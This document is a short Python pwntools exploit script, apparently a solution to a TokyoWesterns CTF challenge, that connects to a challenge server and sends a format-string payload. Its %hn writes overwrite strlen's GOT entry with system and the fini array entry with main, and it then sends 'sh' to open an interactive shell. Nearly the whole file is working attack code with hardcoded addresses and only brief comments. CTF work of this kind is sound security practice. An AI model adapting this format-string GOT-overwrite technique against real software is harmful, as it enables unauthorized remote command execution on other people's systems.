#!/usr/bin/env python

from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn2.chal.ctf.westerns.tokyo', 16317)

raw_input('#')

main = 0x080485ed
system = 0x8048490
strlen_got = 0x08049a54
fini = 0x08049950

payload = 'AA' # padding
payload += p32(strlen_got+2) # put this in first since the higher bytes i want is 0x0804 which is smaller than 0x8490 
payload += p32(strlen_got) 
payload += p32(fini) # since the address of fini is 0x0804xxxx so we just have to change its lower 2 bytes -> 0x85ed

printed = 20 + 4*3

def pad(func, p, low_or_high):
    if low_or_high != 0:
        return ((((func) & 0xffff) - p) % 0xffff + 0xffff) % 0xffff
    else :
        return ((((func >> 2*8) & 0xffff) - p) % 0xffff + 0xffff) % 0xffff

for i in range(3):
    if i < 2:
        f = system
    else :
        f = main
    padding = pad(f, printed, i)
    if padding > 0:
        payload += '%%%dc' % (padding)
    payload += '%%%d$hn' % (12+i)
    printed += padding

r.sendline(payload)

r.sendline('sh\x00')

r.interactive()
